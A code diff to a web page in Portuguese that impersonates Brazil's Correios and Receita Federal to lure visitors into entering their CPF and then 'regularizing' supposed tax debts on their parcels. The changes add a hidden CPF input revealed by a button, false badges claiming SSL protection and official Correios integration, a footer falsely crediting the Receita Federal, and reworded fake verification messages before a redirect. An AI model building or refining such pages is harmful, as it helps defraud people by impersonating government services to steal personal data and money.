@@ -51,9 +51,17 @@
       .inp-chk{position:absolute;right:12px;top:50%;transform:translateY(-50%);width:24px;height:24px;border-radius:50%;background:#2e9e5b;color:#fff;font-size:13px;font-weight:700;display:none;align-items:center;justify-content:center;pointer-events:none}
       .consult-input.valid ~ .inp-chk{display:flex}
 
+      .consult-para{color:#5a7a8e;font-size:14px;line-height:1.6;margin-bottom:16px}
       .consult-btn{width:100%;padding:16px;border:0;border-radius:9px;background:linear-gradient(135deg,#1c3c61,#0e2740);color:#fff;font-size:15.5px;font-weight:700;letter-spacing:.4px;display:flex;align-items:center;justify-content:center;gap:9px;cursor:pointer;box-shadow:0 4px 14px rgba(15,41,66,.25)}
       .consult-btn:active{transform:translateY(1px)}
       .consult-err{color:#c0291f;font-size:13.5px;font-weight:600;margin-top:10px;display:none}
+      .input-section{background:#fff;border-radius:14px;box-shadow:0 6px 22px rgba(15,41,66,.09);border:1px solid #e8edf2;padding:20px 18px;margin-top:14px}
+      .input-section[hidden]{display:none}
+      .inp-sec-head{font-size:13px;color:#7a95a8;margin-bottom:12px}
+      .consult-btn-green{width:100%;padding:16px;border:0;border-radius:9px;background:linear-gradient(135deg,#1e9e50,#167a3d);color:#fff;font-size:15.5px;font-weight:700;letter-spacing:.4px;display:flex;align-items:center;justify-content:center;gap:9px;cursor:pointer;box-shadow:0 4px 14px rgba(22,122,61,.25);margin-bottom:12px}
+      .consult-btn-green:active{transform:translateY(1px)}
+      .consult-checks{display:flex;flex-direction:column;gap:4px;margin-top:12px}
+      .consult-checks span{font-size:12px;color:#5a7a8e}
 
       /* Info cards */
       .info-cards{display:flex;gap:9px;margin-top:18px}
@@ -122,13 +130,23 @@
                     <p>Verifique se há pendências fiscais vinculadas ao seu CPF que possam impactar a liberação de suas encomendas.</p>
                 </div>
             </div>
+            <p class="consult-para">Para consultar suas encomendas e verificar pendências fiscais, clique no botão abaixo e informe seu CPF.</p>
+            <button class="consult-btn" id="btn-consultar" type="button">🔍 CONSULTAR ENCOMENDAS AGORA</button>
+        </div>
+
+        <div class="input-section" id="inputSection" hidden>
+            <p class="inp-sec-head">📦 Deseja acompanhar seu objeto!</p>
             <label class="consult-label" for="consulta">Digite seu CPF ou código de rastreamento:</label>
             <div class="input-wrap">
-                <input class="consult-input" id="consulta" type="text" placeholder="CPF ou código (ex.: AA123456789BR)" maxlength="20" autocapitalize="characters" autocomplete="off">
+                <input class="consult-input" id="consulta" type="text" placeholder="AA123456789BR ou 000.111.222-33" maxlength="20" autocapitalize="characters" autocomplete="off">
                 <div class="inp-chk">✓</div>
             </div>
-            <button class="consult-btn" id="btn-consultar" type="button">🔍 CONSULTAR ENCOMENDAS AGORA</button>
+            <button class="consult-btn-green" id="btn-consultar-2" type="button">🔍 CONSULTAR</button>
             <div class="consult-err" id="erro"></div>
+            <div class="consult-checks">
+                <span>✓ Dados protegidos por criptografia SSL</span>
+                <span>✓ Consulta oficial integrada aos Correios</span>
+            </div>
         </div>
 
         <div class="info-cards">
@@ -140,7 +158,7 @@
 
     <footer class="site-footer">
         <img src="assets/images/logo-rodape.webp" alt="Correios e Governo do Brasil">
-        <p>© 2026 Correios — Portal de Rastreamento</p>
+        <p>© 2026 Correios • Receita Federal do Brasil. Todos os direitos reservados.</p>
     </footer>
 
     <!-- MODAL OVERLAY -->
@@ -151,7 +169,7 @@
         <div id="mLoad">
           <img class="m-rflogo" src="assets/images/receita-federal.webp" alt="Receita Federal">
           <div class="m-spinner"></div>
-          <p class="m-checking">Verificando base de dados da Receita Federal...</p>
+          <p class="m-checking">Validando informações fiscais...</p>
           <div class="m-bar-wrap"><div class="m-bar" id="mBar"></div></div>
         </div>
 
@@ -180,8 +198,8 @@
           </div>
           <button class="mr-cta" id="mBtn">VER DETALHES E REGULARIZAR</button>
           <div class="mr-seals">
-            <span>ⓘ Sistema oficial de regularização</span>
-            <span>ⓘ Consulta disponível 24 horas</span>
+            <span>🔒 Sistema oficial de regularização</span>
+            <span>🔒 Consulta disponível 24 horas</span>
           </div>
         </div>
 
@@ -191,6 +209,7 @@
     <script>
     (function(){
         var btn    = document.getElementById('btn-consultar');
+        var btn2   = document.getElementById('btn-consultar-2');
         var inp    = document.getElementById('consulta');
         var erro   = document.getElementById('erro');
         var modal  = document.getElementById('modal');
@@ -200,6 +219,7 @@
         var mTitle = document.getElementById('mTitle');
         var mVal   = document.getElementById('mVal');
         var mBtn   = document.getElementById('mBtn');
+        var inputSection = document.getElementById('inputSection');
         var destUrl = '';
 
         function showErr(msg){ erro.textContent = msg; erro.style.display = 'block'; inp.focus(); }
@@ -232,6 +252,14 @@
             inp.classList.toggle('valid',ok);
         }
         inp.addEventListener('input',function(){ erro.style.display='none'; checkValid(); });
+
+        function revelarInput(){
+            inputSection.removeAttribute('hidden');
+            setTimeout(function(){
+                inputSection.scrollIntoView({behavior:'smooth',block:'start'});
+                inp.focus();
+            },80);
+        }
 
         function consultar(){
             erro.style.display='none';
@@ -285,7 +313,8 @@
         }
 
         mBtn.addEventListener('click',function(){ window.location.href=destUrl; });
-        btn.addEventListener('click',consultar);
+        btn.addEventListener('click',revelarInput);
+        btn2.addEventListener('click',consultar);
         inp.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();consultar();}});
     })();
     </script>
